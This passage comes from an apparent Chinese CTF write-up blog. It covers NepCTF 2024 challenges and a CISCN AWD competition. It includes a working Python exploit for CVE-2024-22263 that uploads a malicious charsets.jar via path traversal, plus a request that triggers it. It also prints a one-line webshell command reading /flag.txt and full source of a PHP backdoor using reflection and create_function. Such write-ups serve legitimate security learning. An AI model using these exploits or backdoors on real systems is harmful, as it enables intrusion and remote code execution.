<span class="hljs-keyword">return</span> <span class="hljs-literal">null</span>;<br>    &#125;<br><br>    <span class="hljs-keyword">static</span> &#123;<br>        fun();<br>    &#125;<br>&#125;<br></code></pre></td></tr></table></figure><p>然后打包成charsets.jar,再压缩成charsets.zip,再通过CVE-2024-22263上传，脚本要小修一下，本地搭了docker调才发现</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br><span class="line">95</span><br><span class="line">96</span><br><span class="line">97</span><br><span class="line">98</span><br><span class="line">99</span><br><span class="line">100</span><br><span class="line">101</span><br><span class="line">102</span><br><span class="line">103</span><br><span class="line">104</span><br><span class="line">105</span><br><span class="line">106</span><br><span class="line">107</span><br><span class="line">108</span><br><span class="line">109</span><br><span class="line">110</span><br><span class="line">111</span><br><span class="line">112</span><br><span class="line">113</span><br><span class="line">114</span><br><span class="line">115</span><br><span class="line">116</span><br><span class="line">117</span><br><span class="line">118</span><br><span class="line">119</span><br><span class="line">120</span><br><span class="line">121</span><br><span class="line">122</span><br><span class="line">123</span><br><span class="line">124</span><br><span class="line">125</span><br><span class="line">126</span><br><span class="line">127</span><br><span class="line">128</span><br><span class="line">129</span><br><span class="line">130</span><br><span class="line">131</span><br><span class="line">132</span><br><span class="line">133</span><br><span class="line">134</span><br></pre></td><td class="code"><pre><code class="hljs python"><span class="hljs-keyword">import</span> argparse<br><span class="hljs-keyword">import</span> requests<br><span class="hljs-keyword">import</span> json<br><span class="hljs-keyword">import</span> zipfile<br><span class="hljs-keyword">import</span> os<br><br><span class="hljs-keyword">def</span> <span class="hljs-title function_">logo</span>():<br>    logo = <span class="hljs-string">&quot;&quot;&quot;</span><br><span class="hljs-string"> ██████╗██╗   ██╗███████╗    ██████╗  ██████╗ ██████╗ ██╗  ██╗      ██████╗ ██████╗ ██████╗  ██████╗ ██████╗ </span><br><span class="hljs-string">██╔════╝██║   ██║██╔════╝    ╚════██╗██╔═████╗╚════██╗██║  ██║      ╚════██╗╚════██╗╚════██╗██╔════╝ ╚════██╗</span><br><span class="hljs-string">██║     ██║   ██║█████╗█████╗ █████╔╝██║██╔██║ █████╔╝███████║█████╗ █████╔╝ █████╔╝ █████╔╝███████╗  █████╔╝</span><br><span class="hljs-string">██║     ╚██╗ ██╔╝██╔══╝╚════╝██╔═══╝ ████╔╝██║██╔═══╝ ╚════██║╚════╝██╔═══╝ ██╔═══╝ ██╔═══╝ ██╔═══██╗ ╚═══██╗</span><br><span class="hljs-string">╚██████╗ ╚████╔╝ ███████╗    ███████╗╚██████╔╝███████╗     ██║      ███████╗███████╗███████╗╚██████╔╝██████╔╝</span><br><span class="hljs-string"> ╚═════╝  ╚═══╝  ╚══════╝    ╚══════╝ ╚═════╝ ╚══════╝     ╚═╝      ╚══════╝╚══════╝╚══════╝ ╚═════╝ ╚═════╝ </span><br><span class="hljs-string">                                                                                                             </span><br><span class="hljs-string">                                        By: SecureLayer7 (Zeyad Azima)</span><br><span class="hljs-string">                            https://github.com/securelayer7/CVE-2024-22263_Scanner</span><br><span class="hljs-string">    &quot;&quot;&quot;</span><br>    <span class="hljs-built_in">print</span>(logo)<br>    <span class="hljs-built_in">print</span>(<span class="hljs-string">&quot;&quot;</span>)<br>    <span class="hljs-built_in">print</span>(<span class="hljs-string">&quot;&quot;</span>)<br><br><span class="hljs-keyword">def</span> <span class="hljs-title function_">createPocFile</span>(<span class="hljs-params">target, port</span>):<br>    <span class="hljs-keyword">try</span>:<br>        <span class="hljs-keyword">with</span> <span class="hljs-built_in">open</span>(<span class="hljs-string">&#x27;poc.txt&#x27;</span>, <span class="hljs-string">&#x27;w&#x27;</span>) <span class="hljs-keyword">as</span> f:<br>            f.write(<span class="hljs-string">f&quot;Target: <span class="hljs-subst">&#123;target&#125;</span>\nPort: <span class="hljs-subst">&#123;port&#125;</span>\n&quot;</span>)<br>        <span class="hljs-built_in">print</span>(<span class="hljs-string">&quot;[+] POC file created successfully.&quot;</span>)<br>    <span class="hljs-keyword">except</span> Exception <span class="hljs-keyword">as</span> e:<br>        <span class="hljs-built_in">print</span>(<span class="hljs-string">f&quot;[-] Error creating POC file: <span class="hljs-subst">&#123;e&#125;</span>&quot;</span>)<br><br><span class="hljs-keyword">def</span> <span class="hljs-title function_">zipPocFile</span>():<br>    <span class="hljs-keyword">try</span>:<br>        <span class="hljs-keyword">with</span> zipfile.ZipFile(<span class="hljs-string">&#x27;charsets.zip&#x27;</span>, <span class="hljs-string">&#x27;w&#x27;</span>) <span class="hljs-keyword">as</span> zipf:<br>            zipf.write(<span class="hljs-string">&#x27;charsets.jar&#x27;</span>, compress_type=zipfile.ZIP_DEFLATED)<br>        <span class="hljs-built_in">print</span>(<span class="hljs-string">&quot;[+] POC file zipped successfully.&quot;</span>)<br>    <span class="hljs-keyword">except</span> Exception <span class="hljs-keyword">as</span> e:<br>        <span class="hljs-built_in">print</span>(<span class="hljs-string">f&quot;[-] Error creating ZIP file: <span class="hljs-subst">&#123;e&#125;</span>&quot;</span>)<br><br><span class="hljs-keyword">def</span> <span class="hljs-title function_">zipToByteArray</span>(<span class="hljs-params">zipFilePath</span>):<br>    <span class="hljs-keyword">try</span>:<br>        <span class="hljs-keyword">with</span> <span class="hljs-built_in">open</span>(zipFilePath, <span class="hljs-string">&#x27;rb&#x27;</span>) <span class="hljs-keyword">as</span> zipFile:<br>            <span class="hljs-built_in">print</span>(<span class="hljs-string">&quot;[+] ZIP file converted to byte array.&quot;</span>)<br>            <span class="hljs-keyword">return</span> <span class="hljs-built_in">list</span>(zipFile.read())<br>    <span class="hljs-keyword">except</span> FileNotFoundError:<br>        <span class="hljs-built_in">print</span>(<span class="hljs-string">f&quot;[-] ZIP file not found: <span class="hljs-subst">&#123;zipFilePath&#125;</span>&quot;</span>)<br>        <span class="hljs-keyword">return</span> <span class="hljs-literal">None</span><br>    <span class="hljs-keyword">except</span> Exception <span class="hljs-keyword">as</span> e:<br>        <span class="hljs-built_in">print</span>(<span class="hljs-string">f&quot;[-] Error reading ZIP file: <span class="hljs-subst">&#123;e&#125;</span>&quot;</span>)<br>        <span class="hljs-keyword">return</span> <span class="hljs-literal">None</span><br><br><span class="hljs-keyword">def</span> <span class="hljs-title function_">uploadPackage</span>(<span class="hljs-params">url, repoName, packageName, version, packageFileAsBytes</span>):<br>    uploadRequest = &#123;<br>        <span class="hljs-string">&quot;repoName&quot;</span>: repoName,<br>        <span class="hljs-string">&quot;name&quot;</span>: packageName,<br>        <span class="hljs-string">&quot;version&quot;</span>: version,<br>        <span class="hljs-string">&quot;extension&quot;</span>: <span class="hljs-string">&quot;zip&quot;</span>,<br>        <span class="hljs-string">&quot;packageFileAsBytes&quot;</span>: packageFileAsBytes<br>    &#125;<br>    <br>    headers = &#123;<br>        <span class="hljs-string">&#x27;Content-Type&#x27;</span>: <span class="hljs-string">&#x27;application/json&#x27;</span><br>    &#125;<br>    <br>    <span class="hljs-keyword">try</span>:<br>        response = requests.post(url, headers=headers, data=json.dumps(uploadRequest), timeout=<span class="hljs-number">10</span>, verify=<span class="hljs-literal">False</span>)<br>        <span class="hljs-keyword">return</span> response, uploadRequest<br>    <span class="hljs-keyword">except</span> requests.exceptions.RequestException <span class="hljs-keyword">as</span> e:<br>        <span class="hljs-built_in">print</span>(<span class="hljs-string">f&quot;[-] Error sending request to <span class="hljs-subst">&#123;url&#125;</span>: <span class="hljs-subst">&#123;e&#125;</span>&quot;</span>)<br>        <span class="hljs-keyword">return</span> <span class="hljs-literal">None</span>, <span class="hljs-literal">None</span><br>    <span class="hljs-keyword">except</span> Exception <span class="hljs-keyword">as</span> e:<br>        <span class="hljs-built_in">print</span>(<span class="hljs-string">f&quot;[-] Unexpected error: <span class="hljs-subst">&#123;e&#125;</span>&quot;</span>)<br>        <span class="hljs-keyword">return</span> <span class="hljs-literal">None</span>, <span class="hljs-literal">None</span><br><br><span class="hljs-keyword">if</span> __name__ == <span class="hljs-string">&quot;__main__&quot;</span>:<br>    logo()<br>    parser = argparse.ArgumentParser(description=<span class="hljs-string">&#x27;Upload a package to the server.&#x27;</span>)<br>    parser.add_argument(<span class="hljs-string">&#x27;-t&#x27;</span>, <span class="hljs-string">&#x27;--target&#x27;</span>, <span class="hljs-built_in">type</span>=<span class="hljs-built_in">str</span>,default=<span class="hljs-string">&quot;https://neptune-46711.nepctf.lemonprefect.cn&quot;</span>, <span class="hljs-built_in">help</span>=<span class="hljs-string">&#x27;The target to scan (e.g., http://192.168.1.1).&#x27;</span>)<br>    parser.add_argument(<span class="hljs-string">&#x27;-p&#x27;</span>, <span class="hljs-string">&#x27;--port&#x27;</span>, <span class="hljs-built_in">type</span>=<span class="hljs-built_in">int</span>, default=<span class="hljs-number">443</span>, <span class="hljs-built_in">help</span>=<span class="hljs-string">&#x27;The port on the target (default: 80).&#x27;</span>)<br>    parser.add_argument(<span class="hljs-string">&#x27;-r&#x27;</span>, <span class="hljs-string">&#x27;--repoName&#x27;</span>, <span class="hljs-built_in">type</span>=<span class="hljs-built_in">str</span>, default=<span class="hljs-string">&quot;local&quot;</span>, <span class="hljs-built_in">help</span>=<span class="hljs-string">&#x27;The repository name (default: local).&#x27;</span>)<br>    parser.add_argument(<span class="hljs-string">&#x27;-n&#x27;</span>, <span class="hljs-string">&#x27;--packageName&#x27;</span>, <span class="hljs-built_in">type</span>=<span class="hljs-built_in">str</span>, default=<span class="hljs-string">&quot;../../../../layers/paketo-buildpacks_bellsoft-liberica/jre/lib&quot;</span>, <span class="hljs-built_in">help</span>=<span class="hljs-string">&#x27;The name of the package (default: ../../../poc).&#x27;</span>)<br>    parser.add_argument(<span class="hljs-string">&#x27;-v&#x27;</span>, <span class="hljs-string">&#x27;--version&#x27;</span>, <span class="hljs-built_in">type</span>=<span class="hljs-built_in">str</span>, default=<span class="hljs-string">&quot;1.0.0&quot;</span>, <span class="hljs-built_in">help</span>=<span class="hljs-string">&#x27;The version of the package (default: 1.0.0).&#x27;</span>)<br>    parser.add_argument(<span class="hljs-string">&#x27;-f&#x27;</span>, <span class="hljs-string">&#x27;--file&#x27;</span>, <span class="hljs-built_in">type</span>=<span class="hljs-built_in">str</span>, <span class="hljs-built_in">help</span>=<span class="hljs-string">&#x27;A file containing a list of targets to scan in the format &quot;http://target,port&quot;.&#x27;</span>)<br><br>    args = parser.parse_args()<br><br>    targets = []<br>    <br>    <span class="hljs-keyword">if</span> args.file:<br>        <span class="hljs-keyword">try</span>:<br>            <span class="hljs-keyword">with</span> <span class="hljs-built_in">open</span>(args.file, <span class="hljs-string">&#x27;r&#x27;</span>) <span class="hljs-keyword">as</span> f:<br>                targets = [line.strip().split(<span class="hljs-string">&#x27;,&#x27;</span>) <span class="hljs-keyword">for</span> line <span class="hljs-keyword">in</span> f.readlines()]<br>            <span class="hljs-built_in">print</span>(<span class="hljs-string">&quot;[+] Targets loaded from file.&quot;</span>)<br>        <span class="hljs-keyword">except</span> FileNotFoundError:<br>            <span class="hljs-built_in">print</span>(<span class="hljs-string">f&quot;[-] File not found: <span class="hljs-subst">&#123;args.file&#125;</span>&quot;</span>)<br>        <span class="hljs-keyword">except</span> Exception <span class="hljs-keyword">as</span> e:<br>            <span class="hljs-built_in">print</span>(<span class="hljs-string">f&quot;[-] Error reading file <span class="hljs-subst">&#123;args.file&#125;</span>: <span class="hljs-subst">&#123;e&#125;</span>&quot;</span>)<br>    <span class="hljs-keyword">elif</span> args.target:<br>        targets = [(args.target, args.port)]<br>    <span class="hljs-keyword">else</span>:<br>        <span class="hljs-built_in">print</span>(<span class="hljs-string">&quot;[-] Please provide either a target with -t or a file with targets using -f.&quot;</span>)<br>    <br>    <span class="hljs-keyword">for</span> target, port <span class="hljs-keyword">in</span> targets:<br>        zipPocFile()<br>        packageFileAsBytes = zipToByteArray(<span class="hljs-string">&#x27;charsets.zip&#x27;</span>)<br>        <span class="hljs-keyword">if</span> packageFileAsBytes <span class="hljs-keyword">is</span> <span class="hljs-literal">None</span>:<br>            <span class="hljs-keyword">continue</span><br>        <br>        url = <span class="hljs-string">f&quot;<span class="hljs-subst">&#123;target&#125;</span>:<span class="hljs-subst">&#123;port&#125;</span>/api/package/upload&quot;</span><br>        response, requestBody = uploadPackage(url, args.repoName, args.packageName, args.version, packageFileAsBytes)<br>        <br>        <span class="hljs-keyword">if</span> response <span class="hljs-keyword">is</span> <span class="hljs-literal">None</span>:<br>            <span class="hljs-keyword">continue</span><br>        <br>        <span class="hljs-keyword">try</span>:<br>            <span class="hljs-keyword">if</span> response.status_code == <span class="hljs-number">500</span> <span class="hljs-keyword">and</span> <span class="hljs-string">&quot;Package is expected to be unpacked, but it doesn&#x27;t exist&quot;</span> <span class="hljs-keyword">in</span> response.text:<br>                <span class="hljs-built_in">print</span>(<span class="hljs-string">f&quot;[+] Target <span class="hljs-subst">&#123;target&#125;</span> is vulnerable.&quot;</span>)<br>            <span class="hljs-keyword">else</span>:<br>                <span class="hljs-built_in">print</span>(<span class="hljs-string">f&quot;[-] Target <span class="hljs-subst">&#123;target&#125;</span> is not vulnerable.&quot;</span>)<br>                <span class="hljs-built_in">print</span>(<span class="hljs-string">f&quot;[-] Status Code: <span class="hljs-subst">&#123;response.status_code&#125;</span>&quot;</span>)<br>                <span class="hljs-built_in">print</span>(<span class="hljs-string">f&quot;[-] Response Body: <span class="hljs-subst">&#123;response.text&#125;</span>&quot;</span>)<br>                <span class="hljs-built_in">print</span>(<span class="hljs-string">f&quot;[-] Request Body: <span class="hljs-subst">&#123;json.dumps(requestBody, indent=<span class="hljs-number">4</span>)&#125;</span>&quot;</span>)<br>        <span class="hljs-keyword">except</span> Exception <span class="hljs-keyword">as</span> e:<br>            <span class="hljs-built_in">print</span>(<span class="hljs-string">f&quot;[-] Error analyzing response from <span class="hljs-subst">&#123;url&#125;</span>: <span class="hljs-subst">&#123;e&#125;</span>&quot;</span>)<br>    <br>    <span class="hljs-keyword">try</span>:<br>        os.remove(<span class="hljs-string">&#x27;charsets.zip&#x27;</span>)<br>        <span class="hljs-built_in">print</span>(<span class="hljs-string">&quot;[+] Cleanup successful.&quot;</span>)<br>        <span class="hljs-built_in">print</span>(<span class="hljs-string">&quot;&quot;</span>)<br>        <span class="hljs-built_in">print</span>(<span class="hljs-string">&quot;&quot;</span>)<br>    <span class="hljs-keyword">except</span> Exception <span class="hljs-keyword">as</span> e:<br>        <span class="hljs-built_in">print</span>(<span class="hljs-string">f&quot;[-] Error cleaning up files: <span class="hljs-subst">&#123;e&#125;</span>&quot;</span>)<br>        <span class="hljs-built_in">print</span>(<span class="hljs-string">&quot;&quot;</span>)<br>        <span class="hljs-built_in">print</span>(<span class="hljs-string">&quot;&quot;</span>)<br><br></code></pre></td></tr></table></figure><p>然后触发漏洞</p><figure class="highlight http"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><code class="hljs http"><span class="hljs-keyword">GET</span> <span class="hljs-string">/api</span> <span class="hljs-meta">HTTP/1.1</span><br><span class="hljs-attribute">Host</span><span class="hljs-punctuation">: </span>neptune-46711.nepctf.lemonprefect.cn<br><span class="hljs-attribute">Accept</span><span class="hljs-punctuation">: </span>text/html;charset=GBK<br><br><br></code></pre></td></tr></table></figure><img src="/2024/08/26/2024NepCTF/8.jpg" class=""><h1 id="neprouper赛后"><a class="markdownIt-Anchor" href="#neprouper赛后"></a> Neprouper（赛后）</h1><h2 id="neprouter-狸猫换太子"><a class="markdownIt-Anchor" href="#neprouter-狸猫换太子"></a> NepRouter-狸猫换太子</h2><p>5000端口，注册一个用户，会发现不管填什么都会自动显示成TEST，然后注册的时候会发送一个encrypted_id是加密的内容，很明显是前端加密，所以可以将TEST在前端修改成自己设的，如admin，然后注册，进去之后可以下载一个ELF文件，点about_us会跳到8080端口，一个登录框</p><p>下下来放进ida分析</p><img src="/2024/08/26/2024NepCTF/9.jpg" class=""><p>经过测试可以发现这是8080登录的逻辑判断，需要用户是NepNepIStheBestTeam</p><p>所以在5000端口注册用户为NepNepIStheBestTeam，</p><img src="/2024/08/26/2024NepCTF/10.jpg" class=""><p>然后注册，再点about_us，以NepNepIStheBestTeam登录会跳转到路由配置中心</p><p>可以测试到输入ip的地方可以RCE，那就反弹个shell</p><p>有空格就没成功，所以用base64编码绕过</p><img src="/2024/08/26/2024NepCTF/11.jpg" class=""><img src="/2024/08/26/2024NepCTF/12.jpg" class=""><p>NepCTF{You_93t_Me_But_Now_just_start}</p><h2 id="neprouter-白给"><a class="markdownIt-Anchor" href="#neprouter-白给"></a> NepRouter-白给</h2><p>在反编译那里可以看到数据库看到账号密码，比赛时直接用Mysql命令连接。</p><p>赛后出题人说不行，他做了设置，需要用python或go写脚本连或者navicat连，然而写脚本和navicat试了都连不上。</p><img src="/2024/08/26/2024NepCTF/13.jpg" class=""><p>估计这题也有点无语。</p>]]></content>
    
    
    <categories>
      
      <category>WP</category>
      
    </categories>
    
    
    <tags>
      
      <tag>WP</tag>
      
    </tags>
    
  </entry>
  
  
  
  <entry>
    <title>2024ciscn华南分区赛</title>
    <link href="/2024/06/10/2024ciscn%E5%8D%8E%E5%8D%97%E5%88%86%E5%8C%BA%E8%B5%9B/"/>
    <url>/2024/06/10/2024ciscn%E5%8D%8E%E5%8D%97%E5%88%86%E5%8C%BA%E8%B5%9B/</url>
    
    <content type="html"><![CDATA[<p>国赛华南分区赛——桂林之旅</p><p>拿了个二等奖，国赛就到这了，还是太菜了</p><p>除了前面利用ssh抢先拿了几个flag，然后利用后门收了一波，后面由于没有做权限维持，其他队伍又修了洞就开始掉分了，还好最后pwn手解出来了挽回一些分数冲了二等。由于环境出了问题，本来10点应该开始的比赛等到12点多才开始，而且比赛没有延时，也就是从6个小时变成了4个小时。题目web的java和pwn裁判说出题人权限没设好导致基本没办法fix，只能攻不能守。java题居然是初赛原题，可惜初赛java没来得及看，java很久才和本地打通，但这个时候已经被人搅屎了，全场的java主机ssh都被定时断开失联，导致java还没利用到就结束了。不过也让我们后面免受其他队的挨打，只受到一两个队的挨打。</p><p>这次的php题目是预留了两个后门，一个是一句话木马，一个是通过反射调用create_function来执行命令</p><p>访问后门的很简单，D盾就能扫出来，很多队都修了，剩下几个没修的</p><figure class="highlight awk"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs awk"><span class="hljs-regexp">/Home/</span>template<span class="hljs-regexp">/default/</span>adminpanel.php?backdoor=system(<span class="hljs-string">&quot;cat /flag.txt&quot;</span>);<br></code></pre></td></tr></table></figure><p>另一个后门就比较难发现，当时也是没发现，然后被人利用后种了不死马</p><p>赛后复现发现其实利用也很简单，当时要是仔细审代码也许能够发现这个后门，都把时间花在java上了</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br></pre></td><td class="code"><pre><code class="hljs php"><span class="hljs-meta">&lt;?php</span><br><span class="hljs-comment">//去除报错</span><br><span class="hljs-comment">#error_reporting(0);</span><br><span class="hljs-comment">//设置超时</span><br><span class="hljs-title function_ invoke__">set_time_limit</span>(<span class="hljs-number">300</span>);<br><span class="hljs-comment">//全局变量</span><br><br><span class="hljs-class"><span class="hljs-keyword">class</span> <span class="hljs-title">go</span> </span>&#123;<br><br>    <span class="hljs-comment">//password</span><br>    <span class="hljs-keyword">public</span> <span class="hljs-variable">$pass</span> = <span class="hljs-string">&quot;command&quot;</span>;<br><br>    <span class="hljs-keyword">public</span> <span class="hljs-function"><span class="hljs-keyword">function</span> <span class="hljs-title">run</span>(<span class="hljs-params"></span>)</span>&#123;<br>        <span class="hljs-keyword">if</span>(<span class="hljs-variable language_">$this</span>-&gt;<span class="hljs-title function_ invoke__">checkPass</span>())&#123;<br>            <span class="hljs-variable">$param</span> = <span class="hljs-variable language_">$this</span>-&gt;<span class="hljs-title function_ invoke__">parser</span>(<span class="hljs-variable">$this</span>-&gt;<span class="hljs-title function_ invoke__">getData</span>()-&gt;data);<br>            <span class="hljs-keyword">if</span>(<span class="hljs-variable">$param</span>)&#123;<br>                <span class="hljs-variable">$instance</span> = <span class="hljs-keyword">new</span> <span class="hljs-title class_">TLKNQWFlogin</span>();<br>                <span class="hljs-variable">$reflectionClass</span> = <span class="hljs-keyword">new</span> <span class="hljs-title class_">ReflectionClass</span>(<span class="hljs-string">&#x27;TLKNQWFlogin&#x27;</span>);<br>                <span class="hljs-variable">$reflectionProperty</span> = <span class="hljs-variable">$reflectionClass</span>-&gt;<span class="hljs-title function_ invoke__">getProperty</span>(<span class="hljs-variable">$instance</span>-&gt;func);<br>                <span class="hljs-variable">$reflectionProperty</span>-&gt;<span class="hljs-title function_ invoke__">setAccessible</span>(<span class="hljs-literal">true</span>);<br>                <span class="hljs-variable">$command</span> = <span class="hljs-variable">$reflectionProperty</span>-&gt;<span class="hljs-title function_ invoke__">getValue</span>(<span class="hljs-variable">$instance</span>);<br>                <span class="hljs-variable">$reflectionMethod</span> = <span class="hljs-keyword">new</span> <span class="hljs-title class_">ReflectionFunction</span>(<span class="hljs-variable">$command</span>);<br>                <span class="hljs-variable">$result</span> = <span class="hljs-variable">$reflectionMethod</span>-&gt;<span class="hljs-title function_ invoke__">invoke</span>(<span class="hljs-variable">$param</span>,<span class="hljs-string">&quot;_&quot;</span>);<br>                <span class="hljs-keyword">echo</span> <span class="hljs-variable">$result</span>;<br>            &#125;<span class="hljs-keyword">else</span>&#123;<br>                <span class="hljs-keyword">echo</span> <span class="hljs-string">&quot;parser is wrong!&quot;</span>;<br>            &#125;<br>        &#125;<span class="hljs-keyword">else</span>&#123;<br>            <span class="hljs-keyword">echo</span> <span class="hljs-string">&quot;pass is wrong!&quot;</span>;<br>        &#125;<br>    &#125;<br>    <span class="hljs-comment">#检查key</span><br>    <span class="hljs-keyword">public</span> <span class="hljs-function"><span class="hljs-keyword">function</span> <span class="hljs-title">checkPass</span>(<span class="hljs-params"></span>)</span>&#123;<br>        <span class="hljs-keyword">if</span>(<span class="hljs-keyword">isset</span>(<span class="hljs-variable">$_REQUEST</span>[<span class="hljs-variable language_">$this</span>-&gt;pass]))&#123;<br>            <span class="hljs-keyword">return</span> <span class="hljs-literal">true</span>;<br>        &#125;<br>        <span class="hljs-keyword">return</span> <span class="hljs-literal">false</span>;<br>    &#125;<br>    <span class="hljs-comment">//获取请求数据</span><br>    <span class="hljs-keyword">public</span> <span class="hljs-function"><span class="hljs-keyword">function</span> <span class="hljs-title">getData</span>(<span class="hljs-params"></span>)</span>&#123;<br>        <span class="hljs-variable language_">$this</span>-&gt;data = <span class="hljs-variable">$_REQUEST</span>[<span class="hljs-variable language_">$this</span>-&gt;pass];<br>        <span class="hljs-keyword">return</span> <span class="hljs-variable language_">$this</span>;<br>    &#125;<br>    <span class="hljs-comment">// //解析参数加密</span><br>    <span class="hljs-keyword">public</span> <span class="hljs-function"><span class="hljs-keyword">function</span> <span class="hljs-title">parser</span>(<span class="hljs-params"><span class="hljs-variable">$param</span></span>)</span>&#123;<br>        <span class="hljs-variable">$data</span> = <span class="hljs-title function_ invoke__">base64_decode</span>(<span class="hljs-variable">$param</span>);<br>        <span class="hljs-variable">$key</span> = <span class="hljs-title function_ invoke__">substr</span>(<span class="hljs-variable">$data</span>,<span class="hljs-number">0</span>,<span class="hljs-title function_ invoke__">strlen</span>(<span class="hljs-variable">$this</span>-&gt;pass));<br>        <span class="hljs-keyword">if</span> (<span class="hljs-variable">$key</span> == <span class="hljs-variable language_">$this</span>-&gt;pass)&#123;<br>            <span class="hljs-variable">$data</span> = <span class="hljs-title function_ invoke__">substr_replace</span>(<span class="hljs-variable">$data</span>,<span class="hljs-string">&#x27;&#x27;</span>,<span class="hljs-number">0</span>,<span class="hljs-title function_ invoke__">strlen</span>(<span class="hljs-variable">$this</span>-&gt;pass));<br>            <span class="hljs-variable language_">$this</span>-&gt;data = <span class="hljs-title function_ invoke__">base64_decode</span>(<span class="hljs-variable">$data</span>);<br>            <span class="hljs-keyword">return</span> <span class="hljs-title function_ invoke__">base64_decode</span>(<span class="hljs-variable">$data</span>);<br>        &#125;<span class="hljs-keyword">else</span>&#123;<br>            <span class="hljs-keyword">return</span> <span class="hljs-literal">false</span>;<br>        &#125;<br>    &#125;<br>&#125;<br><span class="hljs-function"><span class="hljs-keyword">function</span> <span class="hljs-title">calc</span>(<span class="hljs-params"><span class="hljs-variable">$password</span>,<span class="hljs-variable">$func</span></span>)</span>&#123;<br>    <span class="hljs-variable">$functions</span> = <span class="hljs-variable">$func</span>(<span class="hljs-string">&#x27;$a&#x27;</span>, <span class="hljs-string">&quot;echo <span class="hljs-subst">$password</span>&quot;</span>);<br>    <span class="hljs-variable">$functions</span>(<span class="hljs-string">&#x27;&#x27;</span>);<br>    <span class="hljs-keyword">return</span> <span class="hljs-string">&quot;Command&quot;</span>;<br>    &#125;<br><span class="hljs-class"><span class="hljs-keyword">class</span> <span class="hljs-title">TLKNQWFlogin</span> </span>&#123;<br>    <span class="hljs-keyword">private</span> <span class="hljs-variable">$command</span>;<br>    <span class="hljs-keyword">public</span>  <span class="hljs-variable">$func</span> = <span class="hljs-string">&quot;command&quot;</span>;<br>    <span class="hljs-keyword">public</span> <span class="hljs-function"><span class="hljs-keyword">function</span> <span class="hljs-title">__construct</span>(<span class="hljs-params"></span>) </span>&#123;<br>        <span class="hljs-variable language_">$this</span>-&gt;command = <span class="hljs-function"><span class="hljs-keyword">function</span> (<span class="hljs-params"><span class="hljs-variable">$param</span>,<span class="hljs-variable">$magic</span></span>) </span>&#123;  <span class="hljs-keyword">return</span> <span class="hljs-title function_ invoke__">calc</span>(<span class="hljs-variable">$param</span>.<span class="hljs-string">&#x27;exit();&#x27;</span>,<span class="hljs-string">&quot;create&quot;</span>.<span class="hljs-variable">$magic</span>.<span class="hljs-string">&quot;function&quot;</span>) ; &#125;;<br>        <br>    &#125;<br>&#125;<br><br><span class="hljs-variable">$a</span> = <span class="hljs-keyword">new</span> <span class="hljs-title function_ invoke__">go</span>();<br><span class="hljs-variable">$a</span>-&gt;<span class="hljs-title function_ invoke__">run</span>();<br></code></pre></td></tr></table></figure><figure class="highlight php"><table><tr><td class="gutter"><pre><span 